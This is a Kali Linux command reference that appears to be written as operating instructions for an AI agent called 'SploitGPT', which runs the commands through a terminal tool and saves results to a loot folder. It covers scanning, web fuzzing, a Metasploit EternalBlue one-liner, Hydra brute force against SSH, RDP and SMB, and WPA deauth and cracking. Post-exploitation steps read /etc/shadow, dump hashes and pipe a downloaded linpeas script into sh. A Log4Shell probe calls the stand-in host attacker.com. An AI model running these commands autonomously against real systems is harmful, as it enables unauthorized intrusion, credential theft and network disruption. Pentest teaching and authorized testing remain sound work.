# Kali Linux Tool Reference for SploitGPT

Use the `terminal` tool to execute these commands. Always save output to loot/ for later analysis.

## Reconnaissance

### Host Discovery
```bash
# Ping sweep (find live hosts)
nmap -sn 10.0.0.0/24 -oA loot/host_discovery

# ARP scan (local network only, very fast)
arp-scan --localnet

# Masscan (extremely fast, good for large ranges)
masscan 10.0.0.0/24 -p1-65535 --rate=1000 -oL loot/masscan.txt
```

### Port Scanning
```bash
# Quick top 1000 ports
nmap -sS -sV 10.0.0.1 -oA loot/nmap_quick

# Full port scan with service detection
nmap -sS -sV -sC -O -p- 10.0.0.1 -oA loot/nmap_full

# UDP scan (slow but important)
nmap -sU --top-ports 100 10.0.0.1 -oA loot/nmap_udp

# Aggressive scan (scripts, versions, OS, traceroute)
nmap -A 10.0.0.1 -oA loot/nmap_aggressive
```

### Service Fingerprinting
```bash
# Banner grabbing
nc -nv 10.0.0.1 80
echo "HEAD / HTTP/1.0\r\n\r\n" | nc 10.0.0.1 80

# SSL/TLS info
sslscan 10.0.0.1:443
testssl.sh 10.0.0.1:443

# SNMP enumeration
snmpwalk -v2c -c public 10.0.0.1
```

## Web Application Testing

### Directory/File Discovery
```bash
# Gobuster (fast, recommended)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o loot/gobuster.txt

# With extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

# Feroxbuster (recursive)
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o loot/ferox.txt

# ffuf (very fast, flexible)
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o loot/ffuf.json
```

### Vulnerability Scanning
```bash
# Nikto (web server scanner)
nikto -h http://target.com -o loot/nikto.txt

# Nuclei (template-based scanner)
nuclei -u http://target.com -o loot/nuclei.txt

# WPScan (WordPress)
wpscan --url http://target.com --enumerate u,vp,vt -o loot/wpscan.txt

# SQLMap (SQL injection)
sqlmap -u "http://target.com/page.php?id=1" --batch --output-dir=loot/sqlmap
```

### Web Crawling
```bash
# Gospider
gospider -s http://target.com -o loot/spider

# Hakrawler
echo "http://target.com" | hakrawler

# Extract URLs from page
curl -s http://target.com | grep -oP 'href="\K[^"]+' | sort -u
```

## Exploitation

### Metasploit Framework
```bash
# Start Metasploit console
msfconsole -q

# Non-interactive exploit (one-liner)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.1; set LHOST 10.0.0.100; run; exit"

# Search for exploits
msfconsole -q -x "search ms17-010; exit"

# List payloads for an exploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; show payloads; exit"

# Run auxiliary module
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.0.0.0/24; run; exit"
```

### Searchsploit (Exploit-DB)
```bash
# Search for exploits
searchsploit apache 2.4
searchsploit -w apache 2.4  # Show URLs

# Copy exploit to current directory
searchsploit -m 12345

# Examine exploit
searchsploit -x 12345
```

### Common Exploits
```bash
# EternalBlue check
nmap -p445 --script smb-vuln-ms17-010 10.0.0.1

# Shellshock check
curl -A "() { :; }; echo 'Vulnerable'" http://target.com/cgi-bin/test.sh

# Log4Shell check
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://target.com
```

## Password Attacks

### Hydra (Network Brute Force)
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1

# HTTP POST login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.1

# Common services
hydra -l admin -P passwords.txt 10.0.0.1 rdp
hydra -l admin -P passwords.txt 10.0.0.1 smb
hydra -l admin -P passwords.txt 10.0.0.1 mysql
```

### Hash Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat (GPU-accelerated)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
```

## SMB/Windows

### Enumeration
```bash
# SMB shares
smbclient -L //10.0.0.1 -N
smbmap -H 10.0.0.1

# Enum4linux (comprehensive)
enum4linux -a 10.0.0.1

# CrackMapExec
crackmapexec smb 10.0.0.1 --shares
crackmapexec smb 10.0.0.1 -u 'guest' -p '' --shares
```

### Access
```bash
# Connect to share
smbclient //10.0.0.1/share -N
smbclient //10.0.0.1/share -U username%password

# Mount share
mount -t cifs //10.0.0.1/share /mnt/share -o username=guest,password=
```

## DNS

```bash
# Zone transfer attempt
dig axfr @ns.target.com target.com
dnsrecon -d target.com -t axfr

# Subdomain enumeration
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
fierce --domain target.com

# DNS lookup
dig target.com ANY
host -a target.com
```

## OSINT / Information Gathering

```bash
# Whois
whois target.com

# theHarvester (emails, subdomains)
theHarvester -d target.com -b all

# Amass (subdomain enum)
amass enum -d target.com -o loot/amass.txt
```

## Wireless (if applicable)

```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng wlan0mon
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w loot/capture wlan0mon

# Deauth attack
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# Crack WPA
aircrack-ng -w /usr/share/wordlists/rockyou.txt loot/capture.cap
```

## Post-Exploitation

### Linux
```bash
# System info
uname -a; cat /etc/*release; id; whoami

# Users
cat /etc/passwd; cat /etc/shadow

# SUID binaries (privesc)
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*

# LinPEAS (automated)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Windows
```bash
# In meterpreter session
sysinfo
getuid
getsystem
hashdump
```

## Wordlists Location

```
/usr/share/wordlists/
├── rockyou.txt           # Passwords (14M)
├── dirb/
│   ├── common.txt        # Web directories
│   └── big.txt           # Larger web directories
├── dirbuster/
│   └── directory-list-2.3-medium.txt
├── seclists/             # If installed
│   ├── Passwords/
│   ├── Usernames/
│   ├── Discovery/
│   └── Fuzzing/
└── metasploit/
    └── various lists
```

## Quick Reference

| Task | Command |
|------|---------|
| Find live hosts | `nmap -sn 10.0.0.0/24` |
| Scan all ports | `nmap -p- 10.0.0.1` |
| Service versions | `nmap -sV 10.0.0.1` |
| Web directories | `gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt` |
| SQL injection | `sqlmap -u "URL?id=1" --batch` |
| SSH brute force | `hydra -l user -P rockyou.txt ssh://IP` |
| SMB shares | `smbmap -H IP` |
